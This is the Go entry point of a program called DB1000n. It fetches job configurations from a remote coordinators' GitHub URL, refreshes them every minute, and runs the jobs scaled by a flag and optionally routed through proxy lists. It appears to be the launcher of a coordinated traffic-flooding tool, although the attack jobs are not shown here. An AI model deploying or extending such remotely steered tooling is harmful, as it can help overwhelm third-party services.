// MIT License

// Copyright (c) [2022] [Arriven (https://github.com/Arriven)]

// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:

// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.

// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

package main

import (
	"context"
	"flag"
	"log"
	"net/http"
	pprofhttp "net/http/pprof"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/Arriven/db1000n/src/jobs"
	"github.com/Arriven/db1000n/src/runner"
	"github.com/Arriven/db1000n/src/runner/config"
	"github.com/Arriven/db1000n/src/utils"
	"github.com/Arriven/db1000n/src/utils/metrics"
	"github.com/Arriven/db1000n/src/utils/ota"
	"github.com/Arriven/db1000n/src/utils/templates"
)

func main() {
	log.SetOutput(os.Stdout)
	log.SetFlags(log.Ldate | log.Lmicroseconds | log.Lshortfile | log.LUTC)
	log.Printf("DB1000n [Version: %s]\n", ota.Version)

	configPaths := flag.String("c", utils.GetEnvStringDefault("CONFIG", "https://raw.githubusercontent.com/db1000n-coordinators/LoadTestConfig/main/config.v0.7.json"), "path to config files, separated by a comma, each path can be a web endpoint")
	backupConfig := flag.String("b", config.DefaultConfig, "raw backup config in case the primary one is unavailable")
	refreshTimeout := flag.Duration("refresh-interval", utils.GetEnvDurationDefault("REFRESH_INTERVAL", time.Minute), "refresh timeout for updating the config")
	scaleFactor := flag.Int("scale", utils.GetEnvIntDefault("SCALE_FACTOR", 1), "used to scale the amount of jobs being launched, effect is similar to launching multiple instances at once")
	debug := flag.Bool("debug", utils.GetEnvBoolDefault("DEBUG", false), "enable debug level logging")
	pprof := flag.String("pprof", utils.GetEnvStringDefault("GO_PPROF_ENDPOINT", ""), "enable pprof")
	help := flag.Bool("h", false, "print help message and exit")
	proxiesURL := flag.String("proxylist-url", utils.GetEnvStringDefault("PROXYLIST_URL", ""), "url to fetch proxylist")
	systemProxy := flag.String("proxy", utils.GetEnvStringDefault("SYSTEM_PROXY", ""), "system proxy to set by default")
	configFormat := flag.String("format", utils.GetEnvStringDefault("CONFIG_FORMAT", "json"), "config format")
	prometheusOn := flag.Bool("prometheus_on", utils.GetEnvBoolDefault("PROMETHEUS_ON", false), "Start metrics exporting via HTTP and pushing to gateways (specified via <prometheus_gateways>)")
	prometheusPushGateways := flag.String("prometheus_gateways", utils.GetEnvStringDefault("PROMETHEUS_GATEWAYS", ""), "Comma separated list of prometheus push gateways")
	doSelfUpdate := flag.Bool("enable-self-update", utils.GetEnvBoolDefault("ENABLE_SELF_UPDATE", false), "Enable the application automatic updates on the startup")

	flag.Parse()

	if *help {
		flag.CommandLine.Usage()

		return
	}

	if *doSelfUpdate {
		ota.DoSelfUpdate()
	}

	if *debug && *pprof == "" {
		*pprof = ":8080"
	}

	if *pprof != "" {
		mux := http.NewServeMux()
		mux.Handle("/debug/pprof/", http.HandlerFunc(pprofhttp.Index))
		mux.Handle("/debug/pprof/cmdline", http.HandlerFunc(pprofhttp.Cmdline))
		mux.Handle("/debug/pprof/profile", http.HandlerFunc(pprofhttp.Profile))
		mux.Handle("/debug/pprof/symbol", http.HandlerFunc(pprofhttp.Symbol))
		mux.Handle("/debug/pprof/trace", http.HandlerFunc(pprofhttp.Trace))

		go func() {
			log.Println(http.ListenAndServe(*pprof, mux))
		}()
	}

	if !metrics.ValidatePrometheusPushGateways(*prometheusPushGateways) {
		log.Fatal("Invalid value for --prometheus_gateways")
	}

	if *proxiesURL != "" {
		templates.SetProxiesURL(*proxiesURL)
	}

	go utils.CheckCountry([]string{"Ukraine"})

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	if *prometheusOn {
		go metrics.ExportPrometheusMetrics(ctx, *prometheusPushGateways)
	}

	r, err := runner.New(&runner.Config{
		ConfigPaths:    *configPaths,
		BackupConfig:   []byte(*backupConfig),
		RefreshTimeout: *refreshTimeout,
		Format:         *configFormat,
		Global:         jobs.GlobalConfig{ProxyURL: *systemProxy, ScaleFactor: *scaleFactor},
	}, *debug)
	if err != nil {
		log.Panicf("Error initializing runner: %v", err)
	}

	go func() {
		// Wait for sigterm
		sigs := make(chan os.Signal, 1)
		signal.Notify(sigs, syscall.SIGTERM)
		<-sigs
		log.Println("Terminating")
		cancel()
	}()

	r.Run(ctx)
}
